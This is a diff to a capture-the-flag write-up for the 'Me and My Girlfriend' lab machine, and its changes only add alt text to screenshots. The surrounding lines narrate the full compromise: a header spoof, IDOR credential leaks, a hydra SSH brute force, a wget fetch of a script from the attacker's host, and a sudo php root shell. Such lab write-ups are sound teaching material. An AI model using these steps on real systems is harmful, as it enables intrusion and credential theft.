@@ -39,7 +39,7 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 22       | ssh         |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/meandmygf/1.webp)
+![performing an nmap scan on the me and my girlfriend machine](https://cdn.ziomsec.com/meandmygf/1.webp)
 
 ## Initial Foothold
 
@@ -51,9 +51,9 @@ Since port 80 was running, I used **curl** to fetch information about the page a
 curl http://TARGET
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/meandmygf/2.webp)
 
-![](https://cdn.ziomsec.com/meandmygf/3.webp)
+![accessing the web application](https://cdn.ziomsec.com/meandmygf/3.webp)
 
 The site had an *HTML comment* that gave me a hint on how it could be accessed. I had to use the *X-Forwarded-For* header and use the localhost IP, i.e., 127.0.0.1, to get the intended result. This is because:
 - '*Sorry This Site Can Only Be Accessed Local*' - it could only be accessed through localhost, i.e., 127.0.0.1.
@@ -70,41 +70,41 @@ X-Forwarded-For: 127.0.0.1
 1. I went to **Proxy** and clicked on **Proxy settings**; then searched for **match and replace**.
 2. I checked the *Only apply to in-scope items* and clicked on **Add**. Then, I added the header in the following manner:
 
-![](https://cdn.ziomsec.com/meandmygf/5.webp)
+![adding an HTTP header](https://cdn.ziomsec.com/meandmygf/5.webp)
 
 3. I then added the target URL to scope by selecting it from the `HTTP history` tab and right clicking on it.
 
-![](https://cdn.ziomsec.com/meandmygf/6.webp)
+![accessing the web application](https://cdn.ziomsec.com/meandmygf/6.webp)
 
 I clicked on *Register* and registered myself with the following credentials:
 - username: `zbot` 
 - password: `pass123`
 
-![](https://cdn.ziomsec.com/meandmygf/7.webp)
+![registering into the web application](https://cdn.ziomsec.com/meandmygf/7.webp)
 
 I then logged in using these credentials.
 
-![](https://cdn.ziomsec.com/meandmygf/8.webp)
+![logging into the web application](https://cdn.ziomsec.com/meandmygf/8.webp)
 
 The **Profile** page had an option to change my password. This page contained 3 fields: Name, Username and Password. Since, they were filled automatically, I could inspect it further to see if it was possible to find information for other users.
 
-![](https://cdn.ziomsec.com/meandmygf/9.webp)
+![password change functionality](https://cdn.ziomsec.com/meandmygf/9.webp)
 
 I turned on my **Burp** Proxy and refreshed this page to intercept the request.
 
-![](https://cdn.ziomsec.com/meandmygf/10.webp)
+![intercepting the request](https://cdn.ziomsec.com/meandmygf/10.webp)
 
 I sent the request to **Repeater** for inspection.
 
-![](https://cdn.ziomsec.com/meandmygf/11.webp)
+![inspecting the HTTP request](https://cdn.ziomsec.com/meandmygf/11.webp)
 
 The response that I received displayed the password in plaintext.
 
-![](https://cdn.ziomsec.com/meandmygf/12.webp)
+![viewing the password](https://cdn.ziomsec.com/meandmygf/12.webp)
 
 Also, upon inspecting the URL, I found that it fetched my details based on an ID.
 
-![](https://cdn.ziomsec.com/meandmygf/13.webp)
+![inspecting the URL](https://cdn.ziomsec.com/meandmygf/13.webp)
 
 So, if I changed the *`user_id`* parameter, I could perform **IDOR**.
 
@@ -114,7 +114,7 @@ So, if I changed the *`user_id`* parameter, I could perform **IDOR**.
 
 I changed the ID value and got multiple user credentials.
 
-![](https://cdn.ziomsec.com/meandmygf/14.webp)
+![exploiting IDOR](https://cdn.ziomsec.com/meandmygf/14.webp)
 
 | id  | username       | password    |
 | --- | -------------- | ----------- |
@@ -130,7 +130,7 @@ Since the target had *SSH* service enabled, I used hydra to test these usernames
 hydra -L USERLIST -P PASSLIST ssh://TARGET
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/15.webp)
+![bruteforcing ssh credentials](https://cdn.ziomsec.com/meandmygf/15.webp)
 
 **hydra** revealed a valid pair of credentials - so I used it to access the box using **ssh**.
 
@@ -139,18 +139,18 @@ ssh alice@TARGET
 # enter password
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/16.webp)
+![gaining shell access as alice](https://cdn.ziomsec.com/meandmygf/16.webp)
 
 I found the user flag inside the `.my_secret` folder.
 
-![](https://cdn.ziomsec.com/meandmygf/17.webp)
+![listing files](https://cdn.ziomsec.com/meandmygf/17.webp)
 
 ```shell
 cd .my_secret/
 cat flag1.txt
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/18.webp)
+![capturing the first flag](https://cdn.ziomsec.com/meandmygf/18.webp)
 
 I also found another note :(
 
@@ -158,7 +158,7 @@ I also found another note :(
 cat my_notes.txt
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/19.webp)
+![finding another note](https://cdn.ziomsec.com/meandmygf/19.webp)
 
 ## Privilege Escalation
 
@@ -171,7 +171,7 @@ $ wget http://KALI:PORT/lse.sh
 $ chmod +x lse.sh
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/20.webp)
+![downloading linux smart enumeration script](https://cdn.ziomsec.com/meandmygf/20.webp)
 
 I then executed the script.
 
@@ -179,18 +179,18 @@ I then executed the script.
 ./lse.sh
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/21.webp)
+![running linux smart enumeration script](https://cdn.ziomsec.com/meandmygf/21.webp)
 
-![](https://cdn.ziomsec.com/meandmygf/22.webp)
+![running linux smart enumeration script](https://cdn.ziomsec.com/meandmygf/22.webp)
 
 It discovered a **sudo** misconfiguration. I was allow to run **php** without a password. I verified the same using `sudo -l`
 
-![](https://cdn.ziomsec.com/meandmygf/23.webp)
+![viewing sudo perms](https://cdn.ziomsec.com/meandmygf/23.webp)
 
 I used **GTFOBins** to understand how I could exploit this misconfiguration.
 - https://gtfobins.github.io/
 
-![](https://cdn.ziomsec.com/meandmygf/24.webp)
+![exploiting sudo privs on php](https://cdn.ziomsec.com/meandmygf/24.webp)
 
 I used the following payload to exploit the misconfiguration and got root access.
 
@@ -199,11 +199,11 @@ $ CMD="/bin/bash" #variable storing shell type.
 $ sudo php -r "system('$CMD');" #execute contents stored in the variable
 ```
 
-![](https://cdn.ziomsec.com/meandmygf/25.webp)
+![exploiting sudo privs on php](https://cdn.ziomsec.com/meandmygf/25.webp)
 
 Finally, I captured the final flag from the root directory.
 
-![](https://cdn.ziomsec.com/meandmygf/26.webp)
+![capturing the root flag](https://cdn.ziomsec.com/meandmygf/26.webp)
 
 ## Closure
 
